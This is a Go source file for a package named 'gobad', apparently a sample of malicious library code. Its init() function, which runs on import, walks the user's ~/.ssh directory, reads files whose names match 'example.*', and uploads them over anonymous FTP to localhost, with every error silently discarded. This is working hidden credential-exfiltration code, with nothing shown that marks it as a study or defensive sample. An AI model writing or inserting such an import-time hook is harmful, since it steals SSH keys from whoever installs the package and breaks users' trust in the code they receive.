package gobad

import (
	"bytes"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"time"

	"github.com/jlaffaye/ftp"
)

func init() {

	home, _ := os.UserHomeDir()


	sshpath := path.Join(home, ".ssh")

	libRegEx, _ := regexp.Compile("example.*")
	// if e != nil {
	// 	log.Fatal(e)
	// }
	

	c, _ := ftp.Dial("localhost:21", ftp.DialWithTimeout(5*time.Second))
	// if err != nil {
	// 	log.Fatal(err)
	// }
	
	_ = c.Login("anonymous", "anonymous")
	// if err != nil {
	// 	log.Fatal(err)
	// }
	
	
	_ = filepath.Walk(sshpath, func(path string, info os.FileInfo, err error) error {
		if err == nil && libRegEx.MatchString(info.Name()) {

			dat, _ := os.ReadFile(fmt.Sprintf("%s/%s", sshpath, info.Name()))
			// if err != nil {
			// 	log.Print(err)
			// }
			r := bytes.NewReader(dat)
			_ = c.Stor(info.Name(),r)
			// if err != nil {
			// 	log.Print(err)
			// }
			// println(info.Name())
		}
		return nil
	})
	// if e != nil {
	// 	log.Fatal(e)
	// }
	c.Quit()
	// if err := c.Quit(); err != nil {
	// 	log.Fatal(err)
	// }
	
}
